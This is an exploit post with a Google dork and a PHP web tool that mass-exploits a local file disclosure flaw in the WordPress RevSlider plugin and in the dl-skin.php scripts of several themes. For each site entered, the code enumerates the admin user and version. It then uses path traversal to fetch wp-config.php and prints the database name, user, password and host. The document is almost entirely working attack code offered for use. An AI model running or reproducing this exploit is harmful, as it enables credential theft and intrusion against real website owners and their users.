# Exploit Title: [Wordpress RevSlider Plugin LFD]
# Google Dork: inurl:/admin-ajax.php?action=revslider_show_image
# Date: 12/29/14
# Exploit Author: FarbodEZRaeL
# Vendor Homepage: iranhack.org
# Software Link: wordpress.org
# Tested on: windows
#Exploit:
<html>
<head>
<title>Exploits Wordpress</title>
</head>
<body style="background-color: rebeccapurple;">

<pre><p><center style="color: aqua;">

=============================================================
=       Exploits Wordpress RevSlider Plugin LFD Vuln        =
=                                                           =
=                    Coded by FarbodEZRaeL                  =
=                    Iranhack Security team                 =
=                       www.iranhack.org                    =
=                     Fix bug Other Version                 =
=============================================================

<pre><href>
<form method='POST'>
<textarea name='sites' cols='45' rows='0'></textarea>
<br>
<input type='submit' value='Exploit' />
</form>

<?php

# Coded by FarbodEZRaeL
# Exploits Wordpress RevSlider Plugin LFD Vuln
@set_time_limit(0);
error_reporting(0);
$sites = explode("\r\n", $_POST['sites']);

foreach($sites as $site) {

$site = trim($site);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "$site");
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0;
Windows NT 5.0)");
$get = curl_exec($ch);
curl_close($ch);
if(preg_match("#WordPress (.*?)/>#", $get, $version)){
$str = str_replace('/>', "", $version[0]);
$str = str_replace('"', "", $str);
}
$users = @file_get_contents("$site/?author=1");
preg_match('/<title>;(.*?)<\/title>/si',$users,$user);
$wpuser = explode('|',$user[1]);
echo " <br>======================================</br>";
echo "Site : ".$site."<br> Wp User : ".$wpuser[0]."<br> Version :
".$str."<br>";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,
"$site/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php");
curl_setopt($ch, CURLOPT_HTTPGET, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 5.01;
Windows NT 5.0)");
$xp = curl_exec ($ch);
curl_close($ch);
if(preg_match("#DB_USER#i",$xp)){
preg_match("#'DB_NAME', '(.*?)'#i",$xp,$DB_NAME);
echo "DB_NAME:{$DB_NAME[1]}<br>";
preg_match("#'DB_USER', '(.*?)'#i",$xp,$DB_USER);
echo "DB_USER:{$DB_USER[1]}<br>";
preg_match("#'DB_PASSWORD', '(.*?)'#i",$xp,$DB_PASSWORD);
echo "DB_PASSWORD:{$DB_PASSWORD[1]}<br>";
preg_match("#'DB_HOST', '(.*?)'#i",$xp,$DB_HOST);
echo "DB_HOST:{$DB_HOST[1]}<br>";

}

$lt =
array("wp-content/themes/construct/lib/scripts/dl-skin.php","wp-content/themes/persuasion/lib/scripts/dl-skin.php","wp-content/themes/manbiz2/lib/scripts/dl-skin.php","wp-content/themes/method/lib/scripts/dl-skin.php","wp-content/themes/elegance/lib/scripts/dl-skin.php","wp-content/themes/modular/lib/scripts/dl-skin.php","wp-content/themes/myriad/lib/scripts/dl-skin.php","wp-content/themes/echelon/lib/scripts/dl-skin.php","wp-content/themes/fusion/lib/scripts/dl-skin.php","wp-content/themes/awake/lib/scripts/dl-skin.php");
foreach($lt as $l){
$site = "$site/$l";
$process = curl_init($site);
curl_setopt($process, CURLOPT_TIMEOUT, 30);
curl_setopt($process, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE
7.0; Windows NT 6.0)");
curl_setopt($process, CURLOPT_HEADER, TRUE);
curl_setopt($process, CURLOPT_POST, 1);
curl_setopt($process, CURLOPT_POSTFIELDS,
"_mysite_download_skin=../../../../../wp-config.php");
curl_setopt($process, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($process, CURLOPT_FOLLOWLOCATION, 1);
$return = curl_exec($process);
if(preg_match("#DB_USER#i",$return)){
preg_match("#'DB_NAME', '(.*?)'#i",$return,$DB_NAME);
echo "DB_NAME:{$DB_NAME[1]}<br>";
preg_match("#'DB_USER', '(.*?)'#i",$return,$DB_USER);
echo "DB_USER:{$DB_USER[1]}<br>";
preg_match("#'DB_PASSWORD', '(.*?)'#i",$return,$DB_PASSWORD);
echo "DB_PASSWORD:{$DB_PASSWORD[1]}<br>";
preg_match("#'DB_HOST', '(.*?)'#i",$return,$DB_HOST);
echo "DB_HOST:{$DB_HOST[1]}<br>";
break;
echo " <br>-----------------------------------</br>";
ob_implicit_flush(true);
ob_end_flush();
}
}
}

?>
</pre></p></center>
